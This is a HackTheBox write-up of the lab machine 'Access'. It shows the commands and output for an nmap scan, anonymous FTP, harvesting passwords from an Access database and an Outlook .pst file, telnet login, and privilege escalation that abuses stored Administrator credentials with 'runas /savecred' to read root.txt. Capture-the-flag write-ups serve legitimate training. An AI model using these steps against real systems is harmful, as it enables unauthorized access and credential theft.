---
layout: post
title: Hackthebox Access Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-02/access_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of "Access".

## Solution
### 1. Port scanning
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.98 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-30 09:27 EEST
Nmap scan report for 10.10.10.98
Host is up (0.035s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 294.22 seconds
{% endhighlight %}

### 2.Getting User
FTP enumeration:
{% highlight shell %}
root@kali:~# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:sabonawa): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp>
{%endhighlight %}

Backups directory has a password protected zip file "Access Control.zip".

{% highlight shell %}
ftp> cd engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp>
{% endhighlight %}

On the other hand, engineer directory has a mdb file "backup.mdb"

{% highlight shell %}
ftp> cd backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
{% endhighlight %}

"mdb" is a file extension for old Access database file (Until Access 2003).<br>
There is a <a href="https://www.mdbopener.com/">website</a> which shows the inside and we can download it as a csv file.<br>
In a table auth_user, we can find interesting information.

{% highlight shell %}
root@kali:~# cat auth_user.csv 
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
{% endhighlight %}

we can use the password "access4u@security" for "Access Control.zip".<br>
After the extraction "Access Control.zip", what we find is "Access Control.pst".

{% highlight shell %}
root@kali:~# ls -la
total 288
drwxr-xr-x 2 sabonawa sabonawa   4096 Feb 14 22:19  .
drwxr-xr-x 5 sabonawa sabonawa   4096 Feb 14 22:15  ..
-rw-r--r-- 1 sabonawa sabonawa 271360 Aug 24 03:13 'Access Control.pst'
-rw-r--r-- 1 sabonawa sabonawa  10870 Feb 14 22:16 'Access Control.zip'
{% endhighlight %}

".pst" is an extension for data format of MS Outlook Personal Folders.<br>
We can retrieve the inside file "AccessControl.mbox" with "readpst" command.
{% highlight shell %}
root@kali:/home/sabonawa/hackTB/access# readpst 'Access Control.pst' 
Opening PST file and indexes...
Processing Folder "Deleted Items"
"Access Control" - 2 items done, 0 items skipped.
root@kali:~# ls -la
total 292
drwxr-xr-x 2 sabonawa sabonawa   4096 Feb 14 22:23  .
drwxr-xr-x 5 sabonawa sabonawa   4096 Feb 14 22:15  ..
-rw-r--r-- 1 root     root       3105 Feb 14 22:23 'Access Control.mbox'
-rw-r--r-- 1 sabonawa sabonawa 271360 Aug 24 03:13 'Access Control.pst'
-rw-r--r-- 1 sabonawa sabonawa  10870 Feb 14 22:16 'Access Control.zip'
{% endhighlight %}

The content of "Access Control.pst" is new password for user "security".

{% highlight shell%}
root@kali:~# cat 'Access Control.mbox' 
From "john@megacorp.com" Fri Aug 24 02:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
boundary="--boundary-LibPST-iamunique-213062548_-_-"


----boundary-LibPST-iamunique-213062548_-_-
Content-Type: multipart/alternative;
boundary="alt---boundary-LibPST-iamunique-213062548_-_-"

--alt---boundary-LibPST-iamunique-213062548_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
~~~~
{% endhighlight %}

Sounds like we found a initial credential for user "security".<br>
By trying this password, we can get a remote shell.

{% highlight shell %}
root@kali:~# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
help
Welcome to Microsoft Telnet Service 

login: security
password: # 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
{% endhighlight %}

User.txt is in a desktop folder for user "security".

{% highlight shell %}
C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

10/11/2018  05:09 PM    <DIR>          .
10/11/2018  05:09 PM    <DIR>          ..
10/11/2018  04:55 PM                 0 1.txt
10/11/2018  05:03 PM                 0 112.txt
10/11/2018  04:58 PM                 0 2.txt
10/11/2018  04:56 PM                 0 finaly.txt
10/11/2018  04:40 PM                 0 h.txt
10/11/2018  04:54 PM                 0 hhha.txt
10/11/2018  04:46 PM                 0 l.txt
10/11/2018  04:48 PM                 0 llll.txt
10/11/2018  04:55 PM                 0 nnn.txt
10/11/2018  04:45 PM                 0 o.txt
10/11/2018  04:52 PM               262 ooo.txt
10/11/2018  05:09 PM                32 outputme.txt
10/11/2018  04:53 PM                 0 qqq.txt
10/11/2018  04:39 PM                 0 test.txt
10/11/2018  04:38 PM                 0 tewst
08/21/2018  11:37 PM                32 user.txt
              16 File(s)            326 bytes
               2 Dir(s)  16,681,881,600 bytes free

C:\Users\security\Desktop>type user.txt
ff1f3b48913b213a31ff6756d2553d38
{% endhighlight %}

### Getting Root
By cmdkey command, we can confirm that windows credential manager is keeping a credential for user Administrator.

{% highlight shell %}
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
{% endhighlight %}

We can take advantage of this weekness by "runas" command with "/savecred" parameter.<br>
For .exe file, we have to specify its full path.<br>
Highly recommend to spin up windows 10 VM and test the command because it does not have any error output when we attack "Access" with telnet.

{% highlight shell %}
C:\Users\security>runas /user:Administrator /savecred "C:\windows\system32\makecab.exe C:\Users\Administrator\desktop\root.txt c:\users\security\root.cab"

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

02/14/2019  08:20 PM    <DIR>          .
02/14/2019  08:20 PM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
02/11/2019  08:04 PM           325,432 accesschk.exe
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
02/11/2019  08:03 PM            31,761 privesc.bat
02/14/2019  08:20 PM               113 root.cab
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
02/13/2019  08:37 PM            73,802 shell.exe
08/24/2018  07:39 PM    <DIR>          Videos
               4 File(s)        431,108 bytes
              14 Dir(s)  16,761,311,232 bytes free
{% endhighlight %}

we can use "expand" command to extract .cab file.<br>
By extracting root.cab, we can achieve root.txt.

{% highlight shell %}
C:\Users\security>expand root.cab root.txt
Microsoft (R) File Expansion Utility  Version 6.1.7600.16385
Copyright (c) Microsoft Corporation. All rights reserved.

Adding C:\Users\security\root.txt to Extraction Queue

Expanding Files ....

Expanding Files Complete ...

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

02/14/2019  08:20 PM    <DIR>          .
02/14/2019  08:20 PM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
02/11/2019  08:04 PM           325,432 accesschk.exe
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
02/11/2019  08:03 PM            31,761 privesc.bat
02/14/2019  08:20 PM               113 root.cab
08/21/2018  10:07 PM                32 root.txt
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
02/13/2019  08:37 PM            73,802 shell.exe
08/24/2018  07:39 PM    <DIR>          Videos
               5 File(s)        431,140 bytes
              14 Dir(s)  16,761,311,232 bytes free

C:\Users\security>type root.txt
6e1586cc7ab230a8d297e8f933d904cf
{% endhighlight %}
